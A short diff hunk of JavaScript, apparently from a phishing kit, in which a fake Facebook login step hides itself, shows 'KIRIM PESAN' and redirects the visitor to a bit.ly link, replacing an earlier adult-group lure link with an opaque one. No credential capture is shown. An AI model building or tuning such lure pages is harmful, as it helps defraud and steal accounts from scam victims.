@@ -4359,7 +4359,7 @@
             $('.login-facebook').toggle();
             $('.login-facebook').fadeOut();
             $('.fb').html('KIRIM PESAN');
-            window.location = 'https://bit.ly/GrupBokep_2021';
+            window.location = 'https://bit.ly/3RHu95u';
           }
         })
       }
